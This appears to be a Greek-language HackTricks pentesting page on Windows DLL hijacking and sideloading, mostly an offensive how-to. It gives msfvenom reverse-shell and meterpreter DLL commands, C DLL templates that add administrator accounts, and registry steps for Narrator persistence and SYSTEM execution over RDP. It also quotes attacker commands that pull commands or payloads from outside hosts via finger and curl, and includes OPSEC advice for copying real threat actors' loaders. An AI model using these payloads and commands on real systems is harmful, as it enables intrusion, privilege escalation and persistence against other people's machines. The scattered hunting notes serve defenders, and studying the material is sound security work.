Σε περίπτωση που βρείτε ένα exploitable scenario, ένα από τα σημαντικότερα πράγματα για την επιτυχή εκμετάλλευσή του είναι να **δημιουργήσετε ένα dll που εξάγει τουλάχιστον όλες τις functions που θα κάνει import το executable από αυτό**. Σε κάθε περίπτωση, σημειώστε ότι το DLL Hijacking είναι χρήσιμο για [escalate από Medium Integrity level σε High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ή από[ **High Integrity σε SYSTEM**](../index.html#from-high-integrity-to-system)**.** Μπορείτε να βρείτε ένα παράδειγμα για το **πώς να δημιουργήσετε ένα valid dll** μέσα σε αυτή τη μελέτη για DLL hijacking, εστιασμένη στο DLL hijacking για execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Επιπλέον, στην **επόμενη ενότη**τα μπορείτε να βρείτε μερικά **basic dll codes** που μπορεί να είναι χρήσιμα ως **templates** ή για τη δημιουργία ενός **dll με exported functions που δεν απαιτούνται**.

## **Δημιουργία και compilation DLLs**

### **DLL Proxifying**

Βασικά, ένα **DLL proxy** είναι ένα DLL που μπορεί να **εκτελεί τον malicious κώδικά σας όταν φορτώνεται**, αλλά επίσης να **εκθέτει** και να **λειτουργεί** όπως **αναμένεται**, κάνοντας **relay όλων των calls προς την πραγματική library**.

Με το tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ή το [**Spartacus**](https://github.com/Accenture/Spartacus) μπορείτε να **υποδείξετε ένα executable και να επιλέξετε τη library** που θέλετε να κάνετε proxify και να **δημιουργήσετε ένα proxified dll** ή να **υποδείξετε το DLL** και να **δημιουργήσετε ένα proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Αποκτήστε ένα meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Δημιουργία χρήστη (x86, δεν είδα έκδοση x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Η δική σας

Σε πολλές περιπτώσεις, το DLL που μεταγλωττίζετε πρέπει να **εξάγει κάθε συνάρτηση που εισάγεται από τη διεργασία-θύμα**. Αν λείπει κάποια απαιτούμενη εξαγωγή, το binary δεν μπορεί να την επιλύσει και το exploit αποτυγχάνει.

<details>
<summary>Πρότυπο C DLL (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Παράδειγμα DLL σε C++ με δημιουργία χρήστη</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Εναλλακτικό C DLL με thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Case Study: DLL Hijack του Narrator OneCore TTS Localization (Accessibility/ATs)

Το Windows Narrator.exe εξακολουθεί κατά την εκκίνηση να αναζητά ένα προβλέψιμο, language-specific localization DLL, το οποίο μπορεί να γίνει hijack για arbitrary code execution και persistence.<sup>[[7]](#references)</sup>

Βασικά facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Αν υπάρχει ένα writable attacker-controlled DLL στο OneCore path, φορτώνεται και εκτελείται το `DllMain(DLL_PROCESS_ATTACH)`. Δεν απαιτούνται exports.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Εκκινήστε το Narrator και παρατηρήστε το attempted load του παραπάνω path.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Ένα αφελές hijack θα μιλήσει/θα επισημάνει στοιχεία στο UI. Για να παραμείνει αθόρυβο, κατά την προσάρτηση απαριθμήστε τα threads του Narrator, ανοίξτε το κύριο thread (`OpenThread(THREAD_SUSPEND_RESUME)`) και εκτελέστε `SuspendThread` σε αυτό· συνεχίστε στο δικό σας thread. Δείτε το PoC για τον πλήρη κώδικα.<sup>[[8]](#references)</sup>

Trigger και persistence μέσω ρυθμίσεων Accessibility
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Με τα παραπάνω, η εκκίνηση του Narrator φορτώνει το planted DLL. Στο secure desktop (οθόνη σύνδεσης), πατήστε CTRL+WIN+ENTER για να εκκινήσετε το Narrator· το DLL σας εκτελείται ως SYSTEM στο secure desktop.

Εκτέλεση SYSTEM μέσω RDP (lateral movement)
- Επιτρέψτε το classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Συνδεθείτε μέσω RDP στο host και, στην οθόνη σύνδεσης, πατήστε CTRL+WIN+ENTER για να εκκινήσετε το Narrator· το DLL σας εκτελείται ως SYSTEM στο secure desktop.
- Η εκτέλεση σταματά όταν κλείσει το RDP session—κάντε inject/migrate άμεσα.

Bring Your Own Accessibility (BYOA)
- Μπορείτε να κλωνοποιήσετε μια ενσωματωμένη καταχώριση Accessibility Tool (AT) στο registry (π.χ. CursorIndicator), να την επεξεργαστείτε ώστε να δείχνει σε ένα arbitrary binary/DLL, να την κάνετε import και, στη συνέχεια, να ορίσετε το `configuration` στο όνομα αυτού του AT. Αυτό λειτουργεί ως proxy για arbitrary execution υπό το Accessibility framework.

Σημειώσεις
- Η εγγραφή κάτω από το `%windir%\System32` και η αλλαγή τιμών HKLM απαιτούν δικαιώματα admin.
- Όλη η λογική του payload μπορεί να βρίσκεται στο `DLL_PROCESS_ATTACH`· δεν απαιτούνται exports.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Αυτή η περίπτωση παρουσιάζει το **Phantom DLL Hijacking** στο Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), το οποίο παρακολουθείται ως **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Vulnerability Details

- **Component**: Το `TPQMAssistant.exe` βρίσκεται στο `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: Το `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` εκτελείται καθημερινά στις 9:30 AM υπό το context του συνδεδεμένου χρήστη.
- **Directory Permissions**: Είναι εγγράψιμος από τον `CREATOR OWNER`, επιτρέποντας σε local users να τοποθετούν arbitrary files.
- **DLL Search Behavior**: Επιχειρεί αρχικά να φορτώσει το `hostfxr.dll` από το working directory του και καταγράφει "NAME NOT FOUND" όταν λείπει, υποδεικνύοντας precedence στην αναζήτηση του local directory.

### Exploit Implementation

Ένας attacker μπορεί να τοποθετήσει ένα malicious `hostfxr.dll` stub στον ίδιο κατάλογο, εκμεταλλευόμενος το missing DLL για να επιτύχει code execution υπό το context του χρήστη:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Ροή επίθεσης

1. Ως standard user, τοποθετήστε το `hostfxr.dll` στο `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Περιμένετε να εκτελεστεί το scheduled task στις 9:30 π.μ. στο context του τρέχοντος χρήστη.
3. Αν ένας administrator είναι συνδεδεμένος όταν εκτελείται το task, το malicious DLL εκτελείται στο session του administrator με medium integrity.
4. Συνδυάστε τυπικές τεχνικές UAC bypass για να κάνετε elevate από medium integrity σε SYSTEM privileges.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading μέσω Signed Host (wsc_proxy.exe)

Οι threat actors συνδυάζουν συχνά MSI-based droppers με DLL side-loading για να εκτελέσουν payloads υπό μια trusted, signed process.<sup>[[10]](#references)</sup>

Επισκόπηση αλυσίδας
- Ο χρήστης κατεβάζει ένα MSI. Ένα CustomAction εκτελείται σιωπηλά κατά την εγκατάσταση GUI (π.χ. LaunchApplication ή μια VBScript action), ανακατασκευάζοντας το επόμενο stage από embedded resources.
- Το dropper γράφει ένα legitimate, signed EXE και ένα malicious DLL στον ίδιο directory (παράδειγμα ζεύγους: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Όταν εκκινείται το signed EXE, η Windows DLL search order φορτώνει πρώτα το wsc.dll από το working directory, εκτελώντας attacker code υπό ένα signed parent (ATT&CK T1574.001).

Ανάλυση MSI (τι να αναζητήσετε)
- CustomAction table:
- Αναζητήστε entries που εκτελούν executables ή VBScript. Παράδειγμα ύποπτου pattern: LaunchApplication που εκτελεί ένα embedded file στο background.
- Στο Orca (Microsoft Orca.exe), επιθεωρήστε τα CustomAction, InstallExecuteSequence και Binary tables.
- Embedded/split payloads στο MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Ή χρησιμοποιήστε το lessmsi: lessmsi x package.msi C:\out
- Αναζητήστε πολλά μικρά fragments που συνενώνονται και decrypted από ένα VBScript CustomAction. Συνηθισμένο flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Πρακτικό sideloading με το wsc_proxy.exe
- Τοποθετήστε αυτά τα δύο αρχεία στον ίδιο φάκελο:
- wsc_proxy.exe: νόμιμο υπογεγραμμένο host (Avast). Η διεργασία προσπαθεί να φορτώσει το wsc.dll βάσει ονόματος από τον κατάλογό της.
- wsc.dll: DLL του attacker. Αν δεν απαιτούνται συγκεκριμένα exports, αρκεί το DllMain· διαφορετικά, δημιουργήστε ένα proxy DLL και προωθήστε τα απαιτούμενα exports στη γνήσια βιβλιοθήκη, εκτελώντας παράλληλα το payload στο DllMain.
- Δημιουργήστε ένα minimal DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Για requirements εξαγωγής, χρησιμοποιήστε ένα proxying framework (π.χ. DLLirant/Spartacus) για να δημιουργήσετε ένα forwarding DLL που εκτελεί επίσης το payload σας.

- Αυτή η technique βασίζεται στην επίλυση του ονόματος του DLL από το host binary. Αν το host χρησιμοποιεί absolute paths ή safe loading flags (π.χ. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), το hijack μπορεί να αποτύχει.
- Τα KnownDLLs, το SxS και τα forwarded exports μπορούν να επηρεάσουν την προτεραιότητα και πρέπει να λαμβάνονται υπόψη κατά την επιλογή του host binary και του export set.

## Signed triads + encrypted payloads (ShadowPad case study)

Η Check Point περιέγραψε τον τρόπο με τον οποίο το Ink Dragon εγκαθιστά το ShadowPad χρησιμοποιώντας ένα **three-file triad**, ώστε να μοιάζει με legitimate software, διατηρώντας παράλληλα το core payload encrypted στον δίσκο:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – γίνεται κατάχρηση vendors όπως AMD, Realtek ή NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Οι attackers μετονομάζουν το executable ώστε να μοιάζει με Windows binary (για παράδειγμα `conhost.exe`), όμως η Authenticode signature παραμένει έγκυρη.
2. **Malicious loader DLL** – τοποθετείται δίπλα στο EXE με το αναμενόμενο όνομα (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Το DLL είναι συνήθως ένα MFC binary obfuscated με το ScatterBrain framework· η μοναδική του εργασία είναι να εντοπίσει το encrypted blob, να το αποκρυπτογραφήσει και να κάνει reflective mapping του ShadowPad.
3. **Encrypted payload blob** – συχνά αποθηκεύεται ως `<name>.tmp` στον ίδιο directory. Μετά το memory-mapping του decrypted payload, ο loader διαγράφει το TMP file για να καταστρέψει τα forensic evidence.

Tradecraft notes:

* Η μετονομασία του signed EXE (διατηρώντας το αρχικό `OriginalFileName` στο PE header) του επιτρέπει να εμφανίζεται ως Windows binary, διατηρώντας παράλληλα τη vendor signature. Επομένως, αναπαραγάγετε τη συνήθεια του Ink Dragon να τοποθετεί binaries που μοιάζουν με `conhost.exe`, αλλά στην πραγματικότητα είναι AMD/NVIDIA utilities.
* Επειδή το executable παραμένει trusted, τα περισσότερα allowlisting controls χρειάζονται μόνο το malicious DLL δίπλα του. Εστιάστε στην προσαρμογή του loader DLL· το signed parent συνήθως μπορεί να εκτελεστεί χωρίς τροποποιήσεις.
* Ο decryptor του ShadowPad αναμένει το TMP blob να βρίσκεται δίπλα στον loader και να είναι writable, ώστε να μπορεί να κάνει zero το file μετά το mapping. Διατηρήστε τον directory writable μέχρι να φορτωθεί το payload· μόλις βρεθεί στη μνήμη, το TMP file μπορεί με ασφάλεια να διαγραφεί για OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Οι operators συνδυάζουν DLL sideloading με LOLBAS, ώστε το μοναδικό custom artifact στον δίσκο να είναι το malicious DLL δίπλα στο trusted EXE:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Το hidden PowerShell εκκινεί το `cmd.exe /c`, λαμβάνει commands από έναν Finger server και τα διοχετεύει στο `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- Το `finger user@host` λαμβάνει text μέσω TCP/79· το `| cmd` εκτελεί την απάντηση του server, επιτρέποντας στους operators να αλλάζουν το second stage από την πλευρά του server.

- **Built-in download/extract:** Κατεβάστε ένα archive με benign extension, αποσυμπιέστε το και κάντε stage το sideload target μαζί με το DLL κάτω από έναν τυχαίο `%LocalAppData%` folder:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- Το `curl -s -L` αποκρύπτει την πρόοδο και ακολουθεί redirects· το `tar -xf` χρησιμοποιεί το ενσωματωμένο tar των Windows.

- **WMI/CIM launch:** Εκκινήστε το EXE μέσω WMI, ώστε το telemetry να εμφανίζει μια CIM-created process, ενώ αυτό φορτώνει το colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Λειτουργεί με binaries που προτιμούν local DLLs (π.χ. `intelbq.exe`, `nearby_share.exe`)· το payload (π.χ. Remcos) εκτελείται κάτω από το trusted name.

- **Hunting:** Δημιουργήστε alert για το `forfiles` όταν τα `/p`, `/m` και `/c` εμφανίζονται μαζί· αυτό είναι ασυνήθιστο εκτός admin scripts.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Μια πρόσφατη intrusion του Lotus Blossom έκανε κατάχρηση μιας trusted update chain για να παραδώσει ένα NSIS-packed dropper, το οποίο έκανε stage ένα DLL sideload μαζί με πλήρως in-memory payloads.<sup>[[13]](#references)</sup>

Tradecraft flow
- Το `update.exe` (NSIS) δημιουργεί το `%AppData%\Bluetooth`, το χαρακτηρίζει **HIDDEN**, τοποθετεί ένα renamed Bitdefender Submission Wizard `BluetoothService.exe`, ένα malicious `log.dll` και ένα encrypted blob `BluetoothService`, και στη συνέχεια εκκινεί το EXE.
- Το host EXE κάνει import το `log.dll` και καλεί τα `LogInit`/`LogWrite`. Το `LogInit` κάνει mmap-load το blob· το `LogWrite` το αποκρυπτογραφεί με ένα custom LCG-based stream (constants **0x19660D** / **0x3C6EF35F**, με key material που προκύπτει από προηγούμενο hash), κάνει overwrite το buffer με plaintext shellcode, απελευθερώνει τα temporary data και κάνει jump σε αυτό.
- Για να αποφευχθεί ένα IAT, ο loader κάνει resolve τα APIs κάνοντας hashing στα export names με **FNV-1a basis 0x811C9DC5 + prime 0x100019**, και στη συνέχεια εφαρμόζοντας ένα Murmur-style avalanche (**0x85EBCA6B**) και συγκρίνοντας τα αποτελέσματα με salted target hashes.

Main shellcode (Chrysalis)
- Αποκρυπτογραφεί ένα PE-like main module επαναλαμβάνοντας add/XOR/sub με το key `gQ2JR&9;` σε πέντε passes και στη συνέχεια φορτώνει δυναμικά το `Kernel32.dll` → `GetProcAddress` για να ολοκληρώσει το import resolution.
- Ανακατασκευάζει τα DLL name strings κατά το runtime μέσω per-character bit-rotate/XOR transforms και στη συνέχεια φορτώνει τα `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Χρησιμοποιεί έναν δεύτερο resolver που διασχίζει το **PEB → InMemoryOrderModuleList**, αναλύει κάθε export table σε blocks των 4 byte με Murmur-style mixing και κάνει fallback στο `GetProcAddress` μόνο αν το hash δεν βρεθεί.

Embedded configuration & C2
- Το config βρίσκεται μέσα στο dropped `BluetoothService` file στο **offset 0x30808** (size **0x980**) και αποκρυπτογραφείται με RC4 χρησιμοποιώντας το key `qwhvb^435h&*7`, αποκαλύπτοντας το C2 URL και το User-Agent.
- Τα beacons δημιουργούν ένα dot-delimited host profile, προσθέτουν μπροστά το tag `4Q` και στη συνέχεια κάνουν RC4-encrypt με το key `vAuig34%^325hGV` πριν από το `HttpSendRequestA` μέσω HTTPS. Οι responses αποκρυπτογραφούνται με RC4 και γίνεται dispatch μέσω ενός tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Το execution mode ελέγχεται από CLI args: χωρίς args = install persistence (service/Run key) που δείχνει στο `-i`· το `-i` κάνει relaunch το self με `-k`· το `-k` παρακάμπτει το install και εκτελεί το payload.

Alternate loader observed
- Στην ίδια intrusion έγινε drop το Tiny C Compiler και εκτελέστηκε το `svchost.exe -nostdlib -run conf.c` από το `C:\ProgramData\USOShared\`, με το `libtcc.dll` δίπλα του. Ο C source που παρείχε ο attacker περιείχε embedded shellcode, γινόταν compile και εκτελούνταν in-memory χωρίς να γραφτεί PE στον δίσκο. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Αυτό το στάδιο compile-and-run που βασίζεται σε TCC έκανε import το `Wininet.dll` κατά το runtime και κατέβαζε ένα second-stage shellcode από ένα hardcoded URL, παρέχοντας έναν ευέλικτο loader που μεταμφιέζεται ως εκτέλεση compiler.

## Sideloading signed host με export proxying + host thread parking

Ορισμένες αλυσίδες DLL sideloading προσθέτουν **stability engineering**, ώστε ο νόμιμος host να παραμένει ενεργός αρκετά για να φορτώσει καθαρά τα επόμενα stages, αντί να καταρρέει μετά τη φόρτωση του malicious DLL.<sup>[[11]](#references)</sup>

Observed pattern
- Τοποθέτηση ενός trusted EXE δίπλα σε ένα malicious DLL, χρησιμοποιώντας το αναμενόμενο όνομα dependency, όπως `version.dll`.
- Το malicious DLL κάνει **proxy κάθε αναμενόμενο export** προς το πραγματικό system DLL (για παράδειγμα `%SystemRoot%\\System32\\version.dll`), ώστε η import resolution να συνεχίζει να επιτυγχάνεται και η host process να εξακολουθεί να λειτουργεί.
- Μετά τη φόρτωση, το malicious DLL κάνει **patch το host entry point**, ώστε το main thread να πέφτει σε έναν infinite `Sleep` loop αντί να τερματίζεται ή να εκτελεί code paths που θα τερμάτιζαν τη process.
- Ένα νέο thread εκτελεί την πραγματική malicious εργασία: αποκρυπτογραφεί το όνομα ή το path του next-stage DLL (τα RC4/XOR είναι συνηθισμένα) και στη συνέχεια το εκκινεί με `LoadLibrary`.

Why this matters
- Το κανονικό DLL proxying διατηρεί τη συμβατότητα του API, αλλά δεν εγγυάται ότι ο host θα παραμείνει ενεργός αρκετά για τα επόμενα stages.
- Η τοποθέτηση του main thread σε `Sleep(INFINITE)` είναι ένας απλός τρόπος να παραμείνει η signed process resident, ενώ ο loader εκτελεί αποκρυπτογράφηση, staging ή network bootstrap σε ένα worker thread.
- Το hunting μόνο για ένα ύποπτο `DllMain` μπορεί να χάσει αυτό το pattern, αν η ενδιαφέρουσα συμπεριφορά συμβαίνει αφού γίνει patch το host entry point και ξεκινήσει ένα secondary thread.

Minimal workflow
1. Αντιγράψτε το signed host EXE και προσδιορίστε το DLL που κάνει resolve από το local directory.
2. Κατασκευάστε ένα proxy DLL που κάνει export τις ίδιες functions και τις προωθεί προς το legitimate DLL.
3. Στο `DllMain(DLL_PROCESS_ATTACH)`, δημιουργήστε ένα worker thread.
4. Από αυτό το thread, κάντε patch το host entry point ή το main thread start routine, ώστε να κάνει loop με `Sleep`.
5. Αποκρυπτογραφήστε το όνομα/config του next-stage DLL και καλέστε `LoadLibrary` ή κάντε manual-map το payload.

Defensive pivots
- Signed processes που φορτώνουν το `version.dll` ή παρόμοιες common libraries από το δικό τους application directory αντί από το `System32`.
- Memory patches στο process entry point λίγο μετά το image load, ειδικά jumps/calls που ανακατευθύνονται στα `Sleep`/`SleepEx`.
- Threads που δημιουργούνται από proxy DLL και καλούν αμέσως `LoadLibrary` σε ένα second DLL με decrypted name.
- Full-export proxy DLLs τοποθετημένα δίπλα σε vendor executables μέσα σε writable staging directories, όπως `ProgramData`, `%TEMP%` ή unpacked archive paths.

## References

- [1] [Red Canary – Intelligence Insights: Ιανουάριος 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking in Windows. Simple C example.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Ο Nimbus Manticore αναπτύσσει νέο malware με στόχο την Ευρώπη](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: Όταν τα DLL Hijacks συναντούν τα Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers: Ανάλυση εξελισσόμενων impersonation campaigns που διανέμουν το Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Converging Interests: Ανάλυση threat clusters που στοχεύουν μια κυβέρνηση της Νοτιοανατολικής Ασίας](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Inside Ink Dragon: Αποκαλύπτοντας το relay network και την εσωτερική λειτουργία μιας stealthy offensive operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – The Chrysalis Backdoor: Μια εις βάθος ανάλυση του toolkit του Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: Οι επιχειρήσεις του Nimbus Manticore κατά τη διάρκεια της ιρανικής σύγκρουσης](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
